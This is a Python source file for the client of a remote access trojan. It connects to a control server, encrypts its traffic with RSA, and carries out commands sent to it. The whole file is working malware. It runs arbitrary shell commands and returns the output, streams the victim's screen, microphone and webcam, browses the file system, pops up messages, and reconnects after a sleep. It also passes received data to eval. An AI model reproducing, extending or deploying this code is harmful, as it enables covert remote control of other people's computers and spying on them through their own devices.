from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import socket, os, time, tkinter, subprocess, vidstream, pyautogui
import threading
from tkinter import messagebox

def connSetup():
    client_socket = socket.socket(socket.AF_INET, 
                                socket.SOCK_STREAM) # Create Socket
    client_socket.connect(("127.0.0.1", 5555))  # Connect to Server

    key_bytes = client_socket.recv(8192)    #Recive Remote Public Key
    remoteKey = serialization.load_pem_public_key(key_bytes)    # Load Remote Public Key

    privateKey = rsa.generate_private_key(65537, 4096)  # Generate RSA Private Key
    publicKey = privateKey.public_key() # Generate RSA Public Key
    toSend = publicKey.public_bytes(encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo) # Format RSA Public Key
    client_socket.send(toSend)  # Send RSA Public Key

    return client_socket, privateKey, remoteKey

def crypt(message: bytes):
    ciphertext = remoteKey.encrypt( # type: ignore
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Encrypt message
    
    return ciphertext

def decrypt(message: bytes, encode='utf-8'):
    mensaje_descifrado = privateKey.decrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Decrypt message
    return mensaje_descifrado.decode(encode)

client_socket, privateKey, remoteKey = connSetup() # Start connection

# Main Code
while True:
    path = os.getcwd()
    client_socket.send(crypt(path.encode()))
    data = client_socket.recv(8192)
    data = decrypt(data)
    try: 
        data = eval(data)
        command = data[0]
    except NameError:
        command = data
    
    if command == "ls":
        path = os.listdir()
        client_socket.send(crypt(str(path).encode()))

    elif command == "pwd":
        Dir = os.getcwd()
        client_socket.send(crypt(Dir.encode()))

    elif command == "cd":
        os.chdir(data[1])
        
    elif command == "messagebox":
        messagebox.showwarning(message=data[1], title=data[2])
    
    elif command == "execute":
        string = ""
        for i in range(1, len(data)): string = string + data[i]
        process = subprocess.run(string, stdout=subprocess.PIPE,
                                 stderr = subprocess.STDOUT,
                                 shell=True)
        out = process.stdout
        if len(out) > 4096:
            data = [out[i:i+100] for i in range(0, len(out), 100)]
            count = len(data)
            count = str(count).encode()
            client_socket.send(crypt(count))
            time.sleep(3)
            for i in range(0, len(data)): 
                client_socket.send(crypt(data[i]))
                time.sleep(0.2)
        else:
            client_socket.send(crypt(b'1'))
            time.sleep(3)
            client_socket.send(crypt(out))

    elif command == "screen":
        client = vidstream.ScreenShareClient("127.0.0.1", 9999)
        if data[1] == "start":
            try:
                screen_thread = threading.Thread(target=client.start_stream())
                screen_thread.start()
            except RuntimeError:
                continue
        elif data[1] == "stop":
            client.stop_stream()
    
    elif command == "audio":
        client = vidstream.AudioSender("127.0.0.1", 9898)
        if data[1] == "start":
            try:
                screen_thread = threading.Thread(target=client.start_stream())
                screen_thread.start()
            except RuntimeError:
                continue
        elif data[1] == "stop":
            client.stop_stream()

    elif command == "camera":
        client = vidstream.CameraClient("127.0.0.1", 9797)
        if data[1] == "start":
            try:
                screen_thread = threading.Thread(target=client.start_stream())
                screen_thread.start()
            except RuntimeError:
                continue
        elif data[1] == "stop":
            client.stop_stream()

    elif command == "sleep":
        client_socket.close()
        while True:
            time.sleep(30)
            try:
                client_socket, privateKey, remoteKey = connSetup()
                break
            except ConnectionRefusedError:
                continue


